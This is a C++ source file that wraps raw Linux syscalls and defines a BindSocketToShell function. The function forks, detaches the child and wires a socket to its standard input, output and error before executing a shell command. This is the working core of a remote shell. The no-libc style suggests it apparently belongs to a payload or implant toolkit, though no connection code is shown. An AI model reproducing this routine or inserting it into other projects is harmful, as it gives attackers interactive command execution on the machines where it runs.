#include "process.h"
#include "syscall.h"
#include "system.h"

// Fork syscall wrapper
SSIZE Process::Fork() noexcept
{
	return System::Call(SYS_FORK);
}

// Dup2 syscall wrapper
SSIZE Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
	return System::Call(SYS_DUP2, (USIZE)oldfd, (USIZE)newfd);
}

// Execve syscall wrapper
SSIZE Process::Execve(const CHAR* pathname, CHAR* const argv[], CHAR* const envp[]) noexcept
{
	return System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
}

// Setsid syscall wrapper
SSIZE Process::Setsid() noexcept
{
	return System::Call(SYS_SETSID);
}

// BindSocketToShell - Main function to bind a socket to a shell process
SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR* cmd) noexcept
{
	if (socketFd < 0 || cmd == nullptr)
	{
		return PROCESS_INVALID_PID;
	}

	SSIZE pid = Fork();

	if (pid < 0)
	{
		// Fork failed
		return PROCESS_INVALID_PID;
	}

	if (pid == 0)
	{
		// Child process

		// Create new session (detach from controlling terminal)
		Setsid();

		// Redirect stdin/stdout/stderr to socket
		Dup2(socketFd, STDIN_FILENO);
		Dup2(socketFd, STDOUT_FILENO);
		Dup2(socketFd, STDERR_FILENO);

		// Close original socket fd if it's not one of the standard fds
		if (socketFd > STDERR_FILENO)
		{
			System::Call(SYS_CLOSE, (USIZE)socketFd);
		}

		// Build argv for execve
		CHAR* argv[2];
		argv[0] = const_cast<CHAR*>(cmd);
		argv[1] = nullptr;

		// Empty environment
		CHAR* envp[1];
		envp[0] = nullptr;

		// Execute the command - this should not return
		Execve(cmd, argv, envp);

		// If execve returns, something went wrong - exit child
		System::Call(SYS_EXIT, 1);
	}

	// Parent process - return child PID
	return pid;
}
